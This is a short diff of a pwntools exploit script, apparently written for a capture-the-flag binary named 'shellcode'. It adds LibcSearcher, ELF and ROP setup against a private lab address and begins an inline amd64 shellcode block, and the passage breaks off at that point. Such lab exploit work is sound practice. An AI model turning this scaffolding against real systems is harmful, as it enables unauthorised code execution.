@@ -1,15 +1,16 @@
 from pwn import * 
 from pwn import p64,u64
-# # from LibcSearcher import *
+from LibcSearcher import *
 
 debug = 0
 gdb_is = 0
+elf_path = "./shellcode"
 # context(arch='i386',os = 'linux')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
-    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
+    context.terminal = ['wt.exe','nt','Ubuntu','-c']
     if not gdb_is:
-        r = process("./shellcode")
+        r = process(elf_path)
     
 else:
     host = "192.168.0.111:53783"
@@ -17,11 +18,12 @@ else:
     gdb_is =0
 
 if gdb_is:
-    r = gdb.debug("./shellcode",'b *0x114514000')
+    r = gdb.debug(elf_path,'b *0x114514000')
     pause()
     pass
 
-# r.interactive()
+elf = ELF(elf_path)
+rop = ROP(elf)
 
 shellcode  = asm('''
 mov rax,0x114514026;
